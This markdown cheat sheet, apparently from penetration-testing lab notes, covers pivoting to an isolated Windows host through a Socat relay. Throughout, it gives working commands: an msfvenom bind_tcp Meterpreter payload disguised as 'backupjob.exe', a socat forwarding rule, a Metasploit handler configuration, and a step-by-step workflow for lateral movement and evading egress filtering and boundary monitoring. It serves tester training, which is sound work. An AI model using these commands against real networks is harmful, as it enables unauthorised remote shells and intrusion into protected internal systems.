
# 🛰️ Socat Redirection with a Bind Shell Cheat Sheet

> [!info] 🧠 What is a Socat Bind Relay?
> 
> Bash
> 
> ```
> Standalone network pivoting technique that forces a compromised target to open a listening port, while a Socat relay intercepts outbound attacker queries and forwards them inward.
> ```
> 
> 💡 Allows administrators and penetration testers to:
> 
> - **Defeat Egress Filtering:** Compromise isolated hosts that completely block outbound connections but accept adjacent inbound traffic.
>     
> - **Invert Connection Ownership:** Control exactly when an exploit tunnel is initialized by actively reaching out to the target network.
>     
> - **Evade Boundary Monitors:** Route interactive framework staging packets through a trusted intermediate proxy server.
>     
> 
> ✔ Common in:
> 
> - Hardened intranet segments, strict perimeter DMZ assessments, and secondary lateral movement phases.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Attack Host (msfconsole) ➔ Compromised Pivot (Socat Listener) ➔ Isolated Target (Active Bind Port)
> ```
> 
> 💡 Key Directional Difference:
> 
> - **Reverse Redirection:** Target dials _outward_ through the pivot to find your machine.
>     
> - **Bind Redirection:** Your attack machine dials _inward_ through the pivot to find the target.
>     
> 
> ✔ Think of it as **calling an extension number inside an office building. The target system leaves its office door open; you call the building's front desk (the Socat relay), and the receptionist instantly transfers your call straight down the hall to the waiting room**.

# 🌳 Structure: Target Sockets & Relay Inversion

> [!info] 📚 Inbound Payload Generation (`msfvenom`)
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=<Target_Bind_Port>
> ```
> 
> 💡 Function:
> 
> - Instructs the hidden host to bind an internal shell session directly to its local system ports (e.g., `8443`) and wait for an adjacent connection.
>     

> [!tip] 📥 Forwarding the Attack Path (`socat`)
> 
> Bash
> 
> ```
> socat TCP4-LISTEN:<Pivot_Port>,fork TCP4:<Target_Internal_IP>:<Target_Bind_Port>
> ```
> 
> 💡 Logic:
> 
> - Sets up a mapping line pointing inward. Socat listens externally on the pivot server; when your attack tool rings that port, Socat forwards the session down into the hidden target's bind port.
>     

# 🔐 Access Methods

|**Pivoting Phase**|**Initiating Machine**|**Target Socket & Destination**|**Core Purpose**|
|---|---|---|---|
|**Target Setup**|Isolated Target (`172.16.5.19`)|`0.0.0.0:8443` (Local Target Space)|Opens a static listening port directly on the target operating system.|
|**Relay Activation**|Compromised Host (`10.129.202.64`)|`172.16.5.19:8443` (Internal Network)|Bridges external query inputs directly across the internal subnet wire.|
|**Session Strike**|Attack Machine (`10.10.14.18`)|`10.129.202.64:8080` (Pivot Interface)|Launches an active framework connection to trigger shell initialization.|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Activating the Bind Redirection Map
> 
> Bash
> 
> ```
> # 1. Execute the standalone Socat proxy map on the Ubuntu pivot server
> ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443 &
>  
> # 2. Confirm the Socat tunnel gateway is holding its public port open
> ubuntu@Webserver:~$ netstat -antp | grep 8080
> # Expected: tcp  0  0 0.0.0.0:8080  0.0.0.0:* LISTEN  <PID>/socat
> ```
> 
> 💡 Flag breakdown & execution conditions:
> 
> - `TCP4-LISTEN:8080` establishes an entry gate on the pivot host to intercept inbound attacker framework calls.
>     
> - `fork` keeps the core utility thread from shutting down after a connection drops, ensuring you retain persistent pivoting entry capabilities.
>     

> [!info] 🔍 Information Revealed
> 
> - **Inbound Stage Delivery Logs:** Running the handler displays staging outputs (`Sending stage (200262 bytes)`), indicating the payload code successfully traversed the Socat pipe into memory.
>     
> - **Session Origin Validation:** Typing `getuid` inside your resulting Meterpreter console confirms that you have established an interactive administrative pipeline on the remote node (`INLANEFREIGHT\victor`).
>     

# ⚠️ Common Misconfigurations

> [!danger] 🔓 Egress-Only Firewall Violations & Host Boundary Collisions
> 
> Bash
> 
> ```
> Target Firewall Block: Windows Defender firewall drops ALL unauthenticated inbound port requests
> Handler Parameter Clash: Setting msf6 RHOST parameters directly to the target IP instead of the pivot IP
> ```
> 
> 💡 Impact:
> 
> - **Connection Refusal drops:** If the target system has strict localized network rules that prevent adjacent hosts (the pivot server) from introducing new traffic, the bind request will be actively rejected.
>     
> - **Routing Execution Errors:** If your attack framework tries to contact the hidden target IP address directly, the packets will error out because your attack box lacks native internet routing lines to that subnet.
>     

# 💥 Protocol-Specific Attacks

> [!warning] ⚙️ Tuning the Inbound Metasploit Handler
> 
> Bash
> 
> ```
> msf6 > use exploit/multi/handler
> msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
> msf6 exploit(multi/handler) > set RHOST 10.129.202.64
> msf6 exploit(multi/handler) > set LPORT 8080
> msf6 exploit(multi/handler) > run
> ```
> 
> 💡 Impact:
> 
> - Converts Metasploit from a passive listening state into an active, aggressive caller.
>     
> - The application dials into the Ubuntu proxy machine on port `8080`, prompting the Socat pipeline to complete the connection handshake out to the hidden asset.
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Compromise an internet-facing machine and ensure the 'socat' compilation binary exists on the system.
> 2. Use msfvenom to build a target 'bind_tcp' executable asset set to hold open an arbitrary internal port (e.g., 8443).
> 3. Move the payload laterally onto the isolated internal machine and execute it to activate the listener socket.
> 4. Boot up Socat on the pivot server, binding it to listen locally on port 8080 and point straight to the target's internal port 8443.
> 5. Launch msfconsole on your attack machine and select the matching 'bind_tcp' multi/handler framework suite.
> 6. Assign the RHOST value to target the pivot host's external address on port 8080 and execute 'run' to hook the shell.
> ```
> 
> 💡 Always make sure your payload internal port configurations exactly match the destination address strings mapped into your Socat tunnel variables.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> bind_tcp Payload     → Leaving a backdoor keyslot unlocked on an internal office workspace door
> Socat Listener       → A call forwarding switchboard on the main office floor mapped to that door
> fork Argument        → Keeping the switchboard operational so multiple calls can route down the hall
> Metasploit Handler   → Dialing the switchboard extension from an outside phone booth to open the door
> ```
> 
> 💡 When internal firewalls completely kill outbound data streams, reverse the tunnel path. Deploy a bind payload to clear the interior lane, and use Socat to pipe your inbound connection requests through.